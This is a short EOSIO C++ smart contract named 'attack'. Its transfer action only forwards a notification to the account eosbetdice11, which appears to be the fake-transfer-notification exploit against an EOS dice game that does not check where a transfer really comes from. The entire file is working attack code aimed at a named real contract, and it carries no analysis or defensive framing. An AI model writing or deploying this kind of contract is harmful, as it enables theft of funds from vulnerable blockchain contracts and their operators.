#include <string>
#include <eosiolib/eosio.hpp>
#include <eosiolib/asset.hpp>
#include <eosiolib/contract.hpp>
using namespace eosio;
using namespace std;

class attack : public eosio::contract {
   public:
      attack(account_name self)
      :eosio::contract(self){
      
      }
      //@abi action
      void transfer( const account_name from, const account_name to, const asset& quantity, const string memo ) {
         require_recipient(N(eosbetdice11));
      }

};

EOSIO_ABI( attack, (transfer) )
